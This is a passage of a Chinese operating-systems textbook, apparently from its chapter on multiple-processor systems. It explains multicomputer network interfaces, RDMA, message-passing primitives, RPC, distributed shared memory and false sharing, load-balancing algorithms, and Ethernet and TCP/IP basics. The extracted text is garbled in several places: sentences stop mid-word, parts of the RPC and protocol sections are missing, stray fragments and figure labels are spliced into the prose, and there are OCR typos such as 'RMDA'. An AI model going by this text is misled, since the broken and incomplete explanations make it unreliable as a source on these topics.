如果网卡被映射进了进程A 的虚拟地址空间，而所到达的包却是进程B的，又该怎么办?
尤其是，如果A 和B属于不同的所有者，其 中任何一方都不打算协助另一方，又怎么办?
一个解决方案是，把接口板映射到所有需要它的进程中去，但是这样做就需要有一个机制用以避免 竞争。
例如，如果A申明接口板上的一个缓冲区，而由于时间片，B 开始运行并且申明同一个缓冲区， 那么就会发生灾难。
需要有某种同步机制，但是那些诸如互斥信号量 (mutex) 一类的机制需要在进程 会彼此协作的前提下才能工作。
在有多个用户分享的环境下，所有的用户都希望其工作尽快完成，某个 用户也许会锁住与接口板有关的互斥信号量而不肯释放。
从这里得到的结论是，对于将接口板映射到用 户空间的方案，只有在每个节点上只有一个用户进程运行时才能够发挥作用，否则必须设置专门的预防 机制(例如，对不同的进程可以把接口板上RAM的不同部分映射到各自的地址空间)。
第二个问题是，内核本身会经常需要访问互连网络，例如，访问远程节点上的文件系统。
如果考虑 让内核与任何用户共享同一块接口板，即便是基于分时方式，也不是一个好主意。
假设当板被映射到用 户空间，收到了一个内核的包，那么怎么办?
或者若某个用户进程向一个伪装成内核的远程机器发送了 一个包，又该怎么办?
结论是，最简单的设计是使用两块网络接口板， 一块映射到用户空间供应用程序 使用，另一块映射到内核空间供操作系统使用。
许多多计算机就正是这样做的。
1.节点至网络接口通信
下一个问题是如何将包送到接口板上。
最快的方法是使用板上的DMA芯片直接将它们从RAM复制 到板上。
这种方式的问题是，DMA 可以使用物理地址而不是虚拟地址，并且独立于CPU 运行，除非存 大I/O MMU。
首先，尽管一个用户进程肯定知道它打算发送的任何包所在的虚拟地址，但它通常不知道 有关的物理地址。
设计一个系统调用进行虚拟地址到物理地址的映射是不可取的，因为把接口板放到用 户空间的首要原因就是为了避免不得不为每个要发送的包进行一次系统调用。
为了以避免上述问题，可采用一类将页面钉住和释放的系统调用，把有关页面标记成暂时不可交换 的。
但是不仅需要有一个系统调用钉住含有每个输出包的页面，还要有另一个系统调用进行释放工作， 这样做的代价太大。
如果包很小，比如64字节或更小，就不能忍受钉住和释放每个缓冲区的开销。
对于 大的包，比如说1KB或更大，也许会容忍相关开销。
对于大小在这两者之间的包，就要取决于硬件的具
2.远程直接内存访问
在上述情况下，降低数据的复制量都需要很大代价。
为了应对这一问题， 一些网络接口支持远程直 接内存访问(RMDA) 技术，允许一台机器直接访问另一台机器的内存。
RMDA 不需要操作系统的参与， 直接从应用的内存空间中读取或写入数据。
RMDA 听起来很好，但也有缺点。
就像普通的DMA 一样，通信节点的操作系统必须要锁定正处在 数据交换中的页面。
同时，仅仅把数据放置在远程计算机的内存中，而其他程序并不知晓时，则并不会 在很大程度上降低延迟。
RDMA 操作成功时并不会发出明确的通知，而是由接收者去轮询内存中的特定 字节。
发送者在传输完成时会修改该字节来通知接收者新数据的到达。
尽管这个方案是可行的，但并不 理想而且费时。
8.2.3 用户层通信软件
在多计算机中，不同CPU 上的进程通过互相发送消息实现通信。
在最简单的情况下，这种消息传送 是暴露给用户进程的。
换句话说，操作系统提供了一种发送和接收消息的途径，而库过程使得这些低层 的调用对用户进程可用。
在较复杂的情形下，通过使得远程通信看起来像过程调用的办法，将实际的消 息传递对用户隐藏起来。
下面将讨论这两种方法。
1.发送和接收
send(dest,&mptr);
而接收消息的调用可能是
receive(addr,&mptr);
前者把由mptr 参数所指向的消息发送给由dest 参数所标识的进程，并且引起对调用者的阻塞，直到该消 息被发出。
后者引起对调用者的阻塞，直到消息到达。
该消息到达后，被复制到由mptr 参数所指向的缓 冲区，并且撤销对调用者的阻塞。
addr 参数指定了接收者要监听的地址。
这两个过程及其参数有许多可 能的变种。
一个问题是如何编址。
由于多计算机是静态的，CPU 数目是固定的，所以处理编址问题的最便利的 办法是使addr由两部分地址组成，其中一部分是CPU 编号，另一部分是在这个已编址的CPU 上的一个进 程或端口的编号。
在这种方式中，每个CPU 可以管理自己的地址而不会有潜在的冲突。
2. 阻塞调用和非阻塞调用
上面所叙述的调用是阻 塞 调 用( 有时 称为同步调用)。
当一个进程调用send 时，它指定一个目标以 及用以发送消息到该目标的一个缓冲区。
当消息发送时，发送进程被阻塞(挂起)。
在消息已经完全发 送出去之前，不会执行跟随在调用send 后面的指令，如图8-19a 所示。
类似地，在消息真正接收并且放入 由参数指定的消息缓冲区之前，对receive 的调用也不会把控制返回。
在receive 中进程保持挂起状态，直 到消息到达为止，这甚至有可能等待若干小时。
在有些系统中，接收者可以指定希望从谁处接收消息， 在这种情况下接收者就保持阻塞状态，直到来自那个发送者的消息到达为止。
312 第 8 章
发送者运行 发送者被阻塞 —
陷入内核
发送者被阻塞
消息正在被发送 a)
发送者运行
从内核返回， 发送者被释放
图8-19 a) 一 个阻塞的send 调 用 ；b) 一 个非阻塞的send 调 用
相对于阻塞调用的另一种方式是非阻塞调用 ( 有时称为异步调用)。
如果send 是非阻塞的，在消息 发出之前，它立即将控制返回给调用者。
这种机制的优点是发送进程可以继续运算，与消息传送并行， 而不是让CPU空闲(假设没有其他可运行的进程)。
通常是由系统设计者做出在阻塞原语和非阻塞原语 之间的选择(或者使用这种原语或者另一种原语),当然也有少数系统中两种原语同时可用，而让用户 决定其喜好。
但是，非阻塞原语所提供的性能优点被其严重的缺点所抵消了：直到消息被送出发送者才能修改消 息缓冲区。
进程在传输过程中重写消息的后果是如此可怕以致不得不慎重考虑。
更糟的是，发送进程不 知道传输何时会结束，所以根本不知道什么时候重用缓冲区是安全的。
不可能永远避免再碰缓冲区。
有三种可能的解决方案。
第一种方案是，让内核复制这个消息到内部的内核缓冲区，然后让进程继 续，如图8-19b所示。
从发送者的视角来看，这个机制与阻塞调用相同：只要进程获得控制，就可以随 意重用缓冲区了。
当然，消息还没有发送出去，但是发送者是不会被这种情况所妨碍的。
这个方案的缺 点是对每个送出的消息都必须将其从用户空间复制进内核空间。
面对大量的网络接口，消息最终要复制 进硬件的传输缓冲区中，所以第一次的复制实质上是浪费。
额外的复制会明显地降低系统的性能。
第二种方案是，当消息发送之后中断发送者，告知缓冲区又可以使用了。
这里不需要复制。
从而节 省了时间，但是用户级中断使编写程序变得棘手，并可能会要处理竞争条件，这些都使得该方案难以设 计并且几乎无法调试。
第三种方案是，让缓冲区写时复制 (copy on write),也就是说，在消息发送出去之前将其标记为只 读。
在消息发送出去之前，如果缓冲区被重用，则进行复制。
这个方案的问题是，除非缓冲区被孤立在 自己的页面上，否则对临近变量的写操作也会导致复制。
此外，需要有额外的管理，因为这样的发送消 息行为隐含着对页面读/写状态的影响。
最后，该页面迟早会再次被写入，它会触发一次不再必要的复制。
这样，在发送端的选择是
1)阻塞发送 (CPU 在消息传输期间空闲)。
2)带有复制操作的非阻塞发送 (CPU 时间浪费在额外的复制上)。
3)带有中断操作的非阻塞发送(造成编程困难)。
4)写时复制(最终可能也会需要额外的复制)。
在正常条件下，第一种选择是最好的，特别是在有多线程的情况下，此时当一个线程由于试图发送被阻 塞后，其他线程还可以继续工作。
它也不需要管理任何内核缓冲区。
而且，正如将图8-19a和图8-19b进 行比较所见到的，如果不需要复制，通常消息会被更快地发出。
正如send可以是阻塞的和非阻塞的一样，receive 也同样可以是阻塞的和非阻塞的。
阻塞调用就是挂 起调用者直到消息到达为止。
如果有多线程可用，这是一种简单的方法。
另外，非阻塞receive只是通知内 核缓冲区所在的位置，并几乎立即返回控制。
可以使用中断来告知消息已经到达。
然而，中断方式编程 困难，并且速度很慢，所以也许对于接收者来说，更好的方法是使用一个过程poll轮询进来的消息。
该过 程报告是否有消息正在等待。
若是，调用者可调用get_message, 它返回第一个到达的消息。
在有些系统 中，编译器可以在代码中合适的地方插入poll调用，不过，要掌握以怎样的频度使用poll则是需要技巧的。
还有另一个选择，其机制是在接收者进程的地址空间中，一个消息的到达自然地引起一个新线程的 创建。
这样的线程称为弹出式线程 (pop-up thread)。
这个线程运行一个预定义的过程，其参数是一个指 向进来消息的指针。
在处理完这个消息之后，该线程直接退出并被自动撤销。
这一想法的变种是，在中断处理程序中直接运行接收者代码，从而避免了创建弹出线程的麻烦。
要 使这个方法更快，消息自身可以带有该处理程序的句柄 (handler), 这样当消息到达时，只在少数几个 指令中可以调用处理程序。
这样做的最大好处在于再也不需要复制了。
处理程序从接口板取到消息并且 即时处理。
这种方式称为主动消息 (active messages; Von Eicken等人，1992)。
由于每条消息中都有处 理程序的句柄，主动消息方式只能在发送者和接收者彼此完全信任的条件下工作。
8.2.4 远程过程调用
尽管消息传递模型提供了一种构造多计算机操作系统的便利方式，但是它有不可救药的缺陷：构造 所有通信的范型 (paradigm) 都是输入/输出。
过程send 和 receive 基本上在做I/O工作，而许多人认为 I/O就是一种错误的编程模型。
这个问题很早就为人所知，但是一直没有什么进展，直到Birrell 和Nelson 在其论文 (Birrell 和 Nelson,1984) 中引进了一种完全不同的方法来解决这个问题。
尽管其思想是令人吃惊的简单(曾经有 人想到过),但其含义却相当精妙。
在本节中，我们将讨论其概念、实现、优点以及缺点。
图8-20 进行远程过程调用的步骤。
存根用灰色表示
实现相关的问题
第三个问题是，参数的类型并不总是能够推导出的，甚至不论是从形式化规约还是从代码自身。
这 方面的一个例子是printf, 其参数的数量可以是任意的(至少一个),而且它们的类型可以是整形、短整 形、长整形、字符、字符串、各种长度的浮点数以及其他类型的任意混合。
试图把printf 作为远程过程 调用实际上是不可能的，因为C是如此的宽松。
然而，如果有一条规则说假如你不使用C或者C++ 来进行 编程才能使用RPC, 那么这条规则是不会受欢迎的。
第四个问题与使用全局变量有关。
通常，调用者和被调用过程除了使用参数之外，还可以通过全局 变量通信。
如果被调用过程此刻被移到远程机器上，代码将失效，因为全局变量不再是共享的了。
这里所叙述的问题并不表示RPC 就此无望了。
事实上，RPC 已经被广泛地使用，不过在实际中为了 使RPC 正常工作需要有一些限制和仔细的考虑。
8.2.5 分布式共享存储器
虽然RPC有它的吸引力，但即便是在多计算机里，很多程序员仍旧偏爱共享存储器的模型并且愿意 使用它。
让人相当吃惊的是，采用一种称为分布式共享存储器 (Distributed Shared Memory,DSM)(Li, 1986;Li 和Hudak,1989) 的技术，就有可能很好地保留共享存储器的幻觉，尽管这个共享存储器实际 并不存在。
虽然这是一个老话题，但相关研究仍然很多(Cai 和Strazdins,2012;Choi 和Jung,2013;
Ohnishi 和Yoshida,2011) 。
研 究DSM 技术是很有用的，它不仅展示了分布式系统的复杂性和其中的许 多问题，而且这个想法本身也很有影响力。
有了DSM, 每个页面都位于如图8-1b所示的某一个存储器中。
每台机器有其自己的虚拟内存和页表。
当一个CPU 在一个它并不拥有的页面上进行LOAD 和STORE 时 ， 会陷入到操作系统当中。
然后操作系统对该页面进行定位，并请求当前持有该页面的CPU 解除对该页面 的映射并通过互连网络发送该页面。
在该页面到达时，页面被映射进来，于是出错指令重新启动。
事实 上，操作系统只是从远程RAM 中而不是从本地磁盘中满足了这个缺页异常。
对用户而言，机器看起来 拥有共享存储器。
实际的共享存储器和DSM 之间的差别如图8-21所示。
在图8-21a中，是一台配有通过硬件实现的物 理共享存储器的真正的多处理机。
在图8-21b中，是由操作系统实现的DSM。
在图8-21c中，我们看到另 一种形式的共享存储器，它通过更高层次的软件实现。
在本章的后面部分，我们会讨论第三种方式，不 过现在还是专注于讨论DSM。
机器1 机器2 机器1 机器2 机器1 机器2
共享存储器
a)
共享存储器
b)
共享存储器
c)
图8-21 实现共享存储器的不同层次：a) 硬 件 ；b) 操作系统；c) 用户层软件
先考察一些DSM的工作细节。
在DSM系统中，地址空间被划分为页面 (page), 这些页面分布在系 统中的所有节点上。
当一个CPU 引用一个非本地的地址时，就产生一个陷阱，DSM 软件调取包含该地址 的页面并重新开始出错指令。
该指令现在可以完整地执行了。
这一概念如图8-22a所示，该系统配有16 个页面的地址空间，4个节点，每个节点能持有6个页面。
在这个例子中，如果CPU 0引用的指令或数据在页面0、2、5或9中，那么引用在本地完成。
引用其 他的页面会导致陷入。
例如，对页面10的引用会导致陷入到DSM 软件，该软件把页面10从节点1移到节 点0,如图8-22b所示。
1.复制
对基本系统的一个改进是复制那些只读页面，如程序代码、只读常量或其他只读数据结构，它可以 明显地提高性能。
举例来说，如果在图8-22中的页面10是一段程序代码，CPU 0对它的使用可以导致将 一个副本送往CPU 0,从而不必使CPU 1的原有存储器被破坏或干扰，如图8-22c所示。
在这种方式中， CPU 0和CPU 1两者可以按需要经常同时引用页面10,而不会产生由于引用不存在的存储器页面而导致 的陷阱。
另一种可能是，不仅复制只读页面，而且复制所有的页面。
只要有读操作在进行，实际上在只读页 面的复制和可读写页面的复制之间不存在差别。
但是，如果一个被复制的页面突然被修改了，就必须采
取必要的措施来避免多个不一致的副本存在。
如何避免不一致性将在下面几节中进行讨论。
由16个页面组成的全局共享的虚拟存储器
图8-22 a) 分布在四台机器中的地址空间页面；b) 在CPU 1引用页面10后的情形；c) 如果页面10是只读的并 且使用了复制的情形
2.伪共享
在某些关键方式上DSM系统与多处理机类似。
在这两种系统中，当引用非本地存储器字时，从该 字所在的机器上取包含该字的一块内存，并放到进行引用的(分别是内存储器或高速缓存)相关机器上。
一个重要的设计问题是应该调取多大一块。
在多处理机中，其高速缓存块的大小通常是32字节或64字节， 这是为了避免占用总线传输的时间过长。
在DSM系统中，块的单位必须是页面大小的整数倍(因为 MMU以页面方式工作),不过可以是1个、2个、4个或更多个页面。
事实上，这样做就模拟了一个更大 尺寸的页面。
对于DSM而言，较大的页面大小有优点也有缺点。
其最大的优点是，因为网络传输的启动时间是 相当长的，所以传递4096字节并不比传输1024个字节多花费多少时间。
在有大量的地址空间需要移动时， 通过采用大单位的数据传输，通常可减少传输的次数。
这个特性是非常重要的，因为许多程序表现出引 用上的局部性，其含义是如果一个程序引用了某页中的一个字，很可能在不久的将来它还会引用同一个 页 面 中 其 他 字 。
另一方面，大页面的传输造成网络长期占用，阻塞了其他进程引起的故障。
还有，过大的有效页面 引起了另一个问题，称为伪共享(false sharing),如图8-23所示。
图8-23中一个页面中含有两个无关的 共享变量A和B。
进程1大量使用A, 进行读写操作。
类似地，进程2经常使用B。
在这种情形下，含有这 两个变量的页面将在两台机器中来回地传送。
这里的问题是，尽管这些变量是无关的，但它们碰巧在同一个页面内，所以当某个进程使用其中一 个变量时，它也得到另一个。
有效页面越大，发生伪共享的可能性也越高；相反，有效页面越小，发生
伪共享的可能性也越少。
在普通的虚拟内存系统中不存在类似的现象。
图8-23 含有两个无关变量的页面的伪共享
理解这个问题并把变量放在相应的地址空间中的高明编译器能够帮助减少伪共享并改善性能。
但是， 说起来容易做起来难。
而且，如果伪共享中节点1使用某个数组中的一个元素，而节点2使用同一数组中 的另一个元素，那么即使再高明的编译器也没有办法消除这个问题。
3.实现顺序一致性
如果不对可写页面进行复制，那么实现一致性是没有问题的。
每个可写页面只对应有一个副本，在 需要时动态地来回移动。
由于并不是总能提前了解哪些页面是可写的，所以在许多DSM 系统中，当一个 进程试图读一个远程页面时，则复制一个本地副本，在本地和远程各自对应的MMU中建立只读副本。
只要所有的引用都做读操作，那么一切正常。
但是，如果有一个进程试图在一个被复制的页面上写入，潜在的一致性问题就会出现，因为只修改 一个副本却不管其他副本的做法是不能接受的。
这种情形与在多处理机中一个CPU试图修改存在于多个 高速缓存中的一个字的情况有类似之处。
在多处理机中的解决方案是，要进行写的CPU首先将一个信号 放到总线上，通知所有其他的CPU丢弃该高速缓存块的副本。
这里的DSM系统以同样的方式工作。
在对 一个共享页面进行写入之前，先向所有持有该页面副本的CPU发出一条消息，通知它们解除映射并丢弃 该页面。
在其所有解除映射等工作完成之后，该CPU便可以进行写操作了。
在有详细约束的情况下，允许可写页面的多个副本存在是有可能的。
一种方法是允许一个进程获得 在部分虚拟地址空间上的一把锁，然后在被锁住的存储空间中进行多个读写操作。
在该锁被释放时，产 生的修改可以传播到其他副本上去。
只要在一个给定的时刻只有一个CPU能锁住某个页面，这样的机制 就能保持一致性。
8.2.6 多计算机调度
在一台多处理机中，所有的进程都在同一个存储器中。
当某个CPU完成其当前任务后，它选择一个 进程并运行。
理论上，所有的进程都是潜在的候选者。
而在一台多计算机中，情形就大不相同了。
每个 节点有其自己的存储器和进程集合。
CPU 1不能突然决定运行位于节点4上的一个进程，而不事先花费相 当大的工作量去获得该进程。
这种差别说明在多计算机上的调度较为容易，但是将进程分配到节点上的 工作更为重要。
下面我们将讨论这些问题。
多计算机调度与多处理机的调度有些类似，但是并不是后者的所有算法都能适用于前者。
最简单的 多处理机算法——维护就绪进程的一个中心链表——就不能工作，因为每个进程只能在其当前所在的 CPU上运行。
不过，当创建一个新进程时，存在着一个决定将其放在哪里的选择，例如，从平衡负载的
考虑出发。
由于每个节点拥有自己的进程，因此可以应用任何本地调度算法。
但是，仍有可能采用多处理机的 群调度，因为唯一的要求是有一个初始的协议来决定哪个进程在哪个时间槽中运行，以及用于协调时间 槽的起点的某种方法。
8.2.7 负载平衡
需要讨论的有关多计算机调度的内容相对较少。
这是因为一旦一个进程被指定给了一个节点，就可 以使用任何本地调度算法，除非正在使用群调度。
不过， 一旦一个进程被指定给了某个节点，就不再有 什么可控制的，因此，哪个进程被指定给哪个节点的决策是很重要的。
这同多处理机系统相反，在多处 理机系统中所有的进程都在同一个存储器中，可以随意调度到任何CPU 上运行。
因此，值得考察怎样以 有效的方式把进程分配到各个节点上。
从事这种分配工作的算法和启发式方法则是所谓的处理器分配算 法 (processor allocation algorithm)。
多年来已出现了大量的处理器(节点)分配算法。
它们的差别是分别有各自的前提和目标。
可知的 进程属性包括CPU 需求、存储器使用以及与每个其他进程的通信量等。
可能的目标包括最小化由于缺少 本地工作而浪费的CPU 周期，最小化总的通信带宽，以及确保用户和进程公平性等。
下面将讨论几个算 法，以使读者了解各种可能的情况。
1. 图论确定算法
有一类被广泛研究的算法用于下面这样一个系统，该系统包含已知CPU 和存储器需求的进程，以及 给出每对进程之间平均流量的已知矩阵。
如果进程的数量大于CPU 的数量k, 则必须把若干个进程分配 给每个CPU 。
其想法是以最小的网络流量完成这个分配工作。
该系统可以用一个带权图表示，每个顶点是一个进程，而每个弧代表两个进程之间的消息流。
在数 学上，该问题就简化为在特定的限制条件下(如每个子图对整个CPU 和存储器的需求低于某些限制), 寻找 一个将图分割(切割)为k个互不连接的子图的方法。
对于每个满足限制条件的解决方案，完全在 单个子图内的弧代表了机器内部的通信，可以忽略。
从一个子图通向另一个子图的弧代表网络通信。
目 标是找出可以使网络流量最小同时满足所有的限制条件的分割方法。
作为一个例子，图8-24给出了一个 有9个进程的系统，这9个进程是进程A至I, 每个弧上标有两个进程之间的平均通信负载(例如，以Mb/s 为单位)。
在图8-24a中，我们将有进程A 、E和G的图划分到节点1上，进程B 、F和H划分在节点2上，而进程 C 、D 和I 划分在节点3上。
整个网络流量是被切割(虚线)的弧上的流量之和，即30个单位。
在图8-24b 中，有一种不同的划分方法，只有28个单位的网络流量。
假设该方法满足所有的存储器和CPU的限制条 件，那么这个方法就是一个更好的选择，因为它需要较少的通信流量。
直观地看，我们所做的是寻找紧耦合(簇内高流量)的簇 (cluster), 并且与其他的簇有较少的交 互(簇外低流量)。
讨论这些问题的最早的论文是(Chow 和Abraham,1982;Lo,1984;Stone 和 Bokhari,1978) 等。
图8-24 将9个进程分配到3个节点上的两种方法
2.发送者发起的分布式启发算法
现在看一些分布式算法。
有一个算法是这样的，当进程创建时，它就运行在创建它的节点上，除非 该节点过载了。
过载节点的度量可能涉及太多的进程，过大的工作集，或者其他度量。
如果过载了，该 节点随机选择另一个节点并询问它的负载情况(使用同样的度量)。
如果被探查的节点负载低于某个阈 值，就将新的进程送到该节点上(Eager 等人，1986)。
如果不是，则选择另一个机器探查。
探查工作并 不会永远进行下去。
在N次探查之内，如果没有找到合适的主机，算法就终止，且进程继续在原有的机 器上运行。
整个算法的思想是负载较重的节点试图甩掉超额的工作，如图8-25a所示。
该图描述了发送 者发起的负载平衡。
a) b)
图8-25 a) 过载的节点寻找可以接收进程的轻载节点；b) 一个空节点寻找工作做
Eager 等人(1986)构造了一个该算法的分析排队模型 (queueing model)。
使用这个模型，所建立
的算法表现良好而且在包括不同的阈值、传输成本以及探查限定等大范围的参数内工作稳定。
但是，应该看到在负载重的条件下，所有的机器都会持续地对其他机器进行探查，徒劳地试图找到 一台愿意接收更多工作的机器。
几乎没有进程能够被卸载，可是这样的尝试会带来巨大的开销。
3.接收者发起的分布式启发算法
上面讨论的算法是由一个过载的发送者发起的，它的一个互补算法是由一个轻载的接收者发起的， 如图8-25b所示。
在这个算法中，只要有一个进程结束，系统就检查是否有足够的工作可做。
如果不是， 它随机选择某台机器并要求它提供工作。
如果该台机器没有可提供的工作，会接着询问第二台，然后是 第三台机器。
如果在N 次探查之后，还是没有找到工作，该节点暂时停止询问，去做任何已经安排好的 工作，而在下一个进程结束之后机器会再次进行询问。
如果没有可做的工作，机器就开始空闲。
在经过 固定的时间间隔之后，它又开始探查。
把这两种算法组合起来是有可能的，当机器工作太多时可以试图卸掉一些工作，而在工作不多时可 以尝试得到一些工作。
此外，机器也许可以通过保留一份以往探查的历史记录(用以确定是否有机器经 常性处于轻载或过载状态)来对随机轮询的方法进行改进。
可以首先尝试这些机器中的某一台，这取决 于发起者是试图卸掉工作还是获得工作。
8.3 分布式系统
首先，一台多计算机的每个节点通常有CPU、RAM、 网卡，可能还有用于分页的硬盘。
与之相反， 分布式系统中的每个节点都是一台完整的计算机，带有全部的外部设备。
其次，一台多计算机的所有节 点一般就在一个房间里，这样它们可以通过专门的高速网络通信，而分布式系统中的节点则可能分散在 全世界范围内。
最后，一台多计算机的所有节点运行同样的操作系统，共享一个文件系统，并处在一个 共同的管理之下，而一个分布式系统的节点可以运行不同的操作系统，每个节点有自己的文件系统，并 且处在不同的管理之下。
一个典型的多计算机的例子如一个公司或一所大学的一个房间中用于诸如药物 建模等工作的1024个节点，而一个典型的分布式系统包括了通过Internet松散协作的上千台机器。
在图8-26 中，对多处理机、多计算机和分布式系统就上述各点进行了比较。
图8-26三类多CPU系统的比较
通过这个表可以清楚地看到，多计算机处于中间位置。
于是一个有趣的问题就是：“多计算机是更 像多处理机还是更像分布式系统?
”很奇怪，答案取决于你的角度。
从技术角度来看，多处理机有共享 存储器而其他两类没有。
这个差别导致了不同的程序设计模式和不同的思考方式。
但是，从应用角度来 看，多处理机和多计算机都不过是在机房中的大设备机架 (rack) 罢了，而在全部依靠Internet 连接计算 机的分布式系统中显然通信要多于计算，并且以不同的方式使用着。
在某种程度上，分布式系统中计算机的松散耦合既是优点又是缺点。
它之所以是优点，是因为这些 计算机可用在各种类型的应用之中，但它也是缺点，因为它由于缺少共同的底层模型而使得这些应用程 序很难编程实现。
在上下文稍有差别的情形下，统一范例的一个简单例子可以在UNIX中找到。
在UNIX中，所有的 I/O 设备被构造成像文件一样。
对键盘、打印机以及串行通信线等都使用相同的方式和相同的原语进行 操作，这样，与保持原有概念上的差异相比，对它们的处理更为容易。
在某种意义上，中间件像是分布式系统的操作系统。
这就是为什么在一本关于操作系统的书中讨论 中间件的原因。
不过另一方面，中间件又不是真正的操作系统，所以我们对中间件有关的讨论不会过于
详细。
较为全面的关于分布式系统的讨论可参见教材《分布式系统》(《Distributed Systems》; Tanenbaum 和van Steen,2007)。
在本章余下的部分，首先我们将快速考察在分布式系统(下层的计算 机网络)中使用的硬件，然后介绍其通信软件(网络协议),接着我们将考虑在这些系统中的各种范型。
图8-27 在分布式系统中中间件的地位
8.3.1 网络硬件
分布式系统构建在计算机网络的上层，所以有必要对计算机网络这个主题做个简要的介绍。
网络主 要有两种，覆盖一座建筑物或一个校园的LAN (局域网，Local Area Networks) 和可用于城市、乡村甚 至世界范围的WAN (广域网，Wide Area Network)。
最重要的LAN类型是以太网 (Ethernet), 所以我们 把它作为LAN的范例来考察。
至于WAN的例子，我们将考察Internet, 尽管在技术上Internet 不是一个网 络，而是上千个分离网络的联邦。
但是，就我们的目标而言，把Internet 视为一个WAN就足够了。
1.以太网
经典的以太网，在IEEE802.3 标准中有具体描述，由用来连接若干计算机的同轴电缆组成。
这些电 缆之所以称为以太网 (Ethernet), 是源于发光以太，人们曾经认为电磁辐射是通过以太传播的。
(19世 纪英国物理学家James Clerk Maxwell发现了电磁辐射可用一个波动方程描述，那时科学家们假设空中必 须充满了某些以太介质，而电磁辐射则在该以太介质中传播。
不过在1887年著名的Michelson-Morley 实 验中，科学家们并未能探测到以太的存在，在这之后物理学家们才意识到电磁辐射可以在真空中传播。
)
在以太网的非常早的第一个版本中，计算机与钻了半截孔的电缆通过一端固定在这些孔中而另一端 与计算机连接的电线相连接。
它们被称为插入式分接头 (vampire tap),如图8-28a中所示。
可是这种接 头很难接正确，所以没过多久，就换用更合适的接头了。
无论怎样，从电气上来看，所有的计算机都被 连接起来，在网络接口卡上的电缆仿佛是被焊上一样。
许多计算机连接到同一根电缆上，需要一个协议来防止混乱。
要在以太网上发送包，计算机首先要 监听电缆，看看是否有其他的计算机正在进行传输。
如果没有，这台计算机便开始传送一个包，其中有 一个短包头，随后是0到1500字节的有效信息载荷(payload)。
如果电缆正在使用中，计算机只是等待 直到当前的传输结束，接着该台计算机开始发送。
以太网有其最大电缆长度限制，以及可连接的最多的计算机台数限制。
要想超过其中一个的限制， 就要在一座大建筑物或校园中连接多个以太网，然后用一种称为桥接器 (bridge) 的设备把这些以太网
连接起来。
桥接器允许信息从一个以太网传递到另一个以太网，而源在桥接器的一边，目的地在桥接器 的另一边。
计算机
以太网
交换机
a) b)
图8-28 a) 经典以太网；b) 交换式以太网
为了避免碰撞问题，现代以太网使用交换机 (switch), 如图8-28b所示。
每个交换机有若干个端口， 一个端口用于连接一台计算机、 一个以太网或另一个交换机。
当一个包成功地避开所有的碰撞并到达交 换机时，它被缓存在交换机中并送往另一个通往目的地机器的端口。
若能忍受较大的交换机成本，可以 使每台机器都拥有自己的端口，从而消除掉所有的碰撞。
作为一种妥协方案，在每个端口上连接少量的 计算机还是有可能的。
在图8-28b中，一个经典的由多个计算机组成以太网连接到交换机的一个端口中， 这个以太网中的计算机通过插入式分接头连接在电缆上。
2. 因特网
ARPANET 在20世纪70年代迅速地成长，结果拥有了上百台计算机。
接着， 一个包无线网络、 一个卫 星网络以及成千的以太网都联在了该网络上，从而变成为网络的联邦，即我们今天所看到的Internet。
图8-29展示了Internet 的一部分。
在图的顶部是其主干网 (backbone) 之一，通常由主干网操作员管 理。
它包括了大量通过宽带光纤连接的路由器，同时连接着其他(竞争)电话公司运行管理的主干网。
除了电话公司为维护和测试所需运行的机器之外，通常没有主机直接联在主干网上。
在Internet 上的所有通信都以包 (packet) 的形式传送。
每个包在其内部携带着目的地的地址，而这 个地址是供路由器使用的。
当一个包来到某个路由器时，该路由器抽取目的地地址并在一个表格(部分) 中进行查询，以找出用哪根出口线发送该包以及发送到哪个路由器。
这个过程不断重复，直到这个包到 达目的主机。
路由表是高度动态的，并且随着路由器和链路的损坏、恢复以及通信条件的变化在连续不 断地更新。
多年来，路由算法得到了深入的研究和修改。
图8-29 Internet的一部分
对某些应用而言，由确认所引入的时延是不可接受的。
一个应用的例子是数字化的语音通信。
对电 话用户而言，他们宁可时而听到一点噪音或一个被歪曲的词，也不会愿意为了确认而接受时延。
信并且要求得到一个返回收据。
当收据回送 到之后，发送者就可以绝对确信，该信已被 送到所希望的地方且没有在路上丢失。
面 向 连接
无 连接
2. 网络协议
所有网络都有高度专门化的规则，用以说明什么消息可以发送以及如何响应这些消息。
例如，在某 些条件下(如文件传送),当一条消息从源送到目的地时，目的地被要求返回一个确认，以表示正确收到 了该消息。
在其他情形下(如数字电话),就不要求这样的确认。
用于特定计算机通信的这些规则的集合， 称为协议 (protocol) 。
有许多种协议，包括路由器一路由器协议、主机-主机协议以及其他协议等。
要了 解计算机网络及其协议的完整论述，可参阅《计算机网络(第5版)》(《Computer Networks》; Tanenbaum和Wetherall,2010)。
大多数分布式系统都使用Internet作为基础，因此这些系统使用的关键协议是两种主要的Internet协 议 ：IP 和TCP 。
IP(Internet Protocol)是一种数据报协议，发送者可以向网络上发出长达64KB的数据报， 并期望它能够到达。
它并不提供任何保证。
当数据报在网络上传送时，它可能被切割成更小的包。
这些 包独立进行传输，并可能通过不同的路由。
当所有的部分都到达目的地时，再把它们按照正确的顺序装 配起来并提交出去。
当前有两个版本的IP 在使用，即v4和v6 。
当前v4仍然占有支配地位，所以我们这里主要讨论它，但 是 ，v6 是未来的发展方向。
每个v4包以一个40字节的包头开始，其中包含32位源地址和32位目标地址。
这些地址就称为IP 地 址 ，它们构成了Internet中路由选择的基础。
通常IP地址写作4个由点隔开的十进制 数，每个数介于0~255之间，例如192.31.231.65。
当一个包到达路由器时，路由器会解析出IP目标地址， 并利用该地址选择路由。
既然IP数据报是非应答的，所以对于Internet 的可靠通信仅仅使用IP是不够的。
为了提供可靠的通信， 通常在IP层之上使用另一种协议，TCP(Transmission Control Protocol,传输控制协议)。
TCP 使用IP来 提供面向连接的数据流。
为了使用TCP, 进程需要首先与一个远程进程建立连接。
被请求的进程需要通 过机器的IP地址和机器的端口号来指定，而对进入的连接感兴趣的进程监听该端口。
这些工作完成之后， 只需把字节流放入连接，那么就能保证它们会从另一端按照正确的顺序完好无损地出来。
TCP的实现是 通过序列号、校检和、出错重传来提供这种保证的。
所有这些对于发送者和接收者进程都是透明的。
它 们看到的只是可靠的进程间通信，就像UNIX 管道一样。
为了了解这些协议的交互过程，我们来考虑一种最简单的情况：要发送的消息很小，在任何一层都
包头
为了与远程机器建立连接(或者仅仅是给它发送一个数据包),需要知道它的IP地址。
因为对于人 们来说管理32位的IP地址列表是很不方便的，所以就产生了一种称为DNS(Domain Name System,域 名 系统)的方案，它作为一个数据库把主机的ASCII 名称映射为对应的IP 地址。
因此就可以用DNS 名称 (如star.cs.vu.nl) 来代替对应的IP地址(如130.37.24.6)。
